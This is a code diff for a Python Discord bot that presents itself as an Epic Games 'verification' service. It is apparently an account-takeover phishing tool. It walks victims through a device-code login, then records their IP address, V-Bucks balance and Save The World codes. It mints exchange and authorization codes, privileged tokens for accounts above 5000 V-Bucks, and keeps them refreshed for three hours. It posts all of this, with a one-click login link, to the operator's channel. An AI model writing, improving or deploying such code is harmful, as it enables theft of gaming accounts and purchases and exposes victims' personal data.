@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication - Final, Stable, and Fast Version.
-- Features: Instant login, 3-hour sessions, 3-minute refresh, and High-Value Auth Code.
-- Last Updated: 2025-11-20 07:30:00
+Discord Bot for Epic Games Authentication - Final version with detailed output.
+- Features: IP Address, STW/V-Bucks logic, 3-hour refresh, and High-Value Auth Code.
+- Last Updated: 2025-11-20 07:24:31
 """
 # --- SETUP AND INSTALLATION ---
 import os
@@ -97,7 +97,6 @@ async def create_epic_auth_session():
     return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code']}
 
 async def get_exchange_for_auth_code(access_token):
-    """AUTHORIZATION CODE FIX: This function performs the necessary token exchange to get a privileged token."""
     try:
         async with aiohttp.ClientSession() as sess:
             async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
@@ -122,15 +121,24 @@ async def get_vbucks_balance(access_token, account_id):
                     if 'Currency:Mtx' in item.get('templateId', ''): return item.get('quantity', 0)
     except Exception: return 0
     return 0
+    
+async def get_stw_codes(access_token, account_id):
+    platforms, all_codes = ['epic', 'xbox', 'psn'], []
+    headers = {"Authorization": f"Bearer {access_token}"}
+    async with aiohttp.ClientSession() as sess:
+        for p in platforms:
+            try:
+                async with sess.get(f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{p}", headers=headers) as r:
+                    if r.status == 200 and (codes := await r.json()): all_codes.extend([f"{p.upper()}: `{c['codeId']}`" for c in codes])
+            except Exception: pass
+    return all_codes
 
 def monitor_epic_auth_sync(device_code, channel_id, user_ip):
-    """Starts the fast, event-driven login monitor."""
     loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
     try: loop.run_until_complete(wait_for_device_code_completion(device_code, channel_id, user_ip))
     finally: loop.close()
 
 async def wait_for_device_code_completion(device_code, channel_id, user_ip):
-    """SPEED FIX: This function provides the fast login response by waiting intelligently."""
     headers = {"Authorization": f"basic {EPIC_API_SWITCH_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
     data = {"grant_type": "device_code", "device_code": device_code}
     async with aiohttp.ClientSession() as sess:
@@ -145,24 +153,30 @@ async def wait_for_device_code_completion(device_code, channel_id, user_ip):
     logger.info("✅ User logged in!")
     access_token, account_id, displayName = token_data['access_token'], token_data['account_id'], token_data['displayName']
     
-    vbucks = await get_vbucks_balance(access_token, account_id)
+    stw_codes = await get_stw_codes(access_token, account_id)
+    vbucks = 0
+    if not stw_codes:
+        vbucks = await get_vbucks_balance(access_token, account_id)
+    
     exchange_code, auth_code, refresh_token = None, None, None
-
     if vbucks > 5000:
         privileged_token, refresh_token = await get_exchange_for_auth_code(access_token)
         if privileged_token:
-            # Use the privileged token for a new exchange code and the auth code
-            exchange_code = (await (await sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {privileged_token}"})).json())['code']
-            auth_code = (await (await sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {privileged_token}"}, allow_redirects=False)).json()).get('authorizationCode')
-            access_token = privileged_token # Use the stronger token for the session
+            async with aiohttp.ClientSession() as http_sess:
+                exchange_response = await http_sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {privileged_token}"})
+                exchange_code = (await exchange_response.json())['code']
+                auth_response = await http_sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {privileged_token}"}, allow_redirects=False)
+                auth_code = (await auth_response.json()).get('authorizationCode')
+                access_token = privileged_token
     else:
-        # For normal accounts, just get the exchange code
-        exchange_code = (await (await sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"})).json())['code']
+        async with aiohttp.ClientSession() as http_sess:
+            exchange_response = await http_sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"})
+            exchange_code = (await exchange_response.json())['code']
 
     session_id = str(uuid.uuid4())[:8]
     info = {'id': account_id, 'displayName': displayName}
     with session_lock:
-        active_sessions[session_id] = {'access_token': access_token, 'refresh_token': refresh_token, 'account_info': info, 'user_ip': user_ip, 'created_at': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active', 'message_id': None, 'channel_id': channel_id, 'vbucks': vbucks}
+        active_sessions[session_id] = {'access_token': access_token, 'refresh_token': refresh_token, 'account_info': info, 'user_ip': user_ip, 'created_at': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active', 'message_id': None, 'channel_id': channel_id, 'stw_codes': stw_codes, 'vbucks': vbucks}
     
     bot.loop.create_task(send_new_login_message(session_id, exchange_code, auth_code))
     bot.loop.create_task(individual_session_refresher(session_id))
@@ -177,7 +191,6 @@ async def individual_session_refresher(session_id):
                 if session.get('status') == 'expired': break
                 access_token, refresh_token = session['access_token'], session.get('refresh_token')
 
-            # AUTHORIZATION CODE FIX: Refresh logic for high-value accounts
             if is_high_value and refresh_token:
                 headers_ios = {"Authorization": f"basic {EPIC_API_IOS_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
                 async with aiohttp.ClientSession() as sess:
@@ -185,14 +198,15 @@ async def individual_session_refresher(session_id):
                         if r.status == 200:
                             new_auth = await r.json()
                             session['access_token'], session['refresh_token'] = new_auth['access_token'], new_auth['refresh_token']
-                            access_token = new_auth['access_token'] # Update token for the rest of the logic
+                            access_token = new_auth['access_token']
             
-            # Now, get the codes with the potentially updated token
             async with aiohttp.ClientSession() as sess:
-                new_exchange_code = (await (await sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"})).json())['code']
+                exchange_res = await sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"})
+                new_exchange_code = (await exchange_res.json())['code']
                 new_auth_code = None
                 if is_high_value:
-                    new_auth_code = (await (await sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {access_token}"}, allow_redirects=False)).json()).get('authorizationCode')
+                    auth_res = await sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {access_token}"}, allow_redirects=False)
+                    new_auth_code = (await auth_res.json()).get('authorizationCode')
 
             if new_exchange_code: session['refresh_count'] += 1; await edit_bot_message(session_id, new_exchange_code=new_exchange_code, new_auth_code=new_auth_code)
     except Exception: pass
@@ -220,13 +234,23 @@ async def edit_bot_message(session_id, new_exchange_code=None, new_auth_code=Non
 def build_embed(session_id, exchange_code=None, auth_code=None, status_override=None):
     with session_lock: session = active_sessions[session_id]
     status, vbucks, name = status_override or session['status'], session.get('vbucks', 0), session['account_info'].get('displayName', 'N/A')
+    user_ip, account_id = session.get('user_ip', 'N/A'), session['account_info'].get('id', 'N/A')
+    stw_codes = session.get('stw_codes', [])
+    
     if status == 'active': title, color, desc = f"✅ Logged In: {name}", 0x57F287, f"**{name}** verified!\n\n🔄 *Refreshing for 3 hours.*"
     elif status == 'expired': title, color, desc = f"🔚 Expired: {name}", 0x737373, f"3-hour window for **{name}** has ended."
     else: title, color, desc = f"🔄 Refreshed: {name}", 0x3498DB, f"New codes for **{name}**!"
     if vbucks > 5000: title = f"💎 {title}"
+    
     embed = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now(timezone.utc))
-    embed.add_field(name="Name", value=name, inline=True).add_field(name="ID", value=f"`{session['account_info'].get('id', 'N/A')}`", inline=False)
-    embed.add_field(name="<:vbucks:1234567890> V-Bucks", value=f"**{vbucks:,}**", inline=False)
+    embed.add_field(name="Display Name", value=name, inline=True)
+    embed.add_field(name="IP Address", value=user_ip, inline=True)
+    embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
+    
+    embed.add_field(name="🔑 Save The World Codes", value="\n".join(stw_codes) if stw_codes else "None", inline=False)
+    if not stw_codes:
+        embed.add_field(name="<:vbucks:1234567890> V-Bucks", value=f"**{vbucks:,}**", inline=False)
+    
     if exchange_code:
         embed.add_field(name="🔗 Login Link", value=f"**[Click to login](https://www.epicgames.com/id/exchange?exchangeCode={exchange_code})**", inline=False)
         embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
@@ -245,7 +269,6 @@ async def setup_target_channel(guild):
     TARGET_CHANNEL_ID = target_channel.id
     permanent_link = f"https://{CUSTOM_DOMAIN}/verify/{PERMANENT_LINK_ID}"
     logger.info(f"✅ Target channel locked: #{target_channel.name}. Link is: {permanent_link}")
-    # NAME CHANGE: Changed from "Rift Bot" to "Epic Auth"
     await target_channel.send(embed=discord.Embed(title="🚀 Epic Auth Bot Activated", description=f"**Verification Link:**\n`{permanent_link}`", color=0x7289DA))
 
 @bot.event
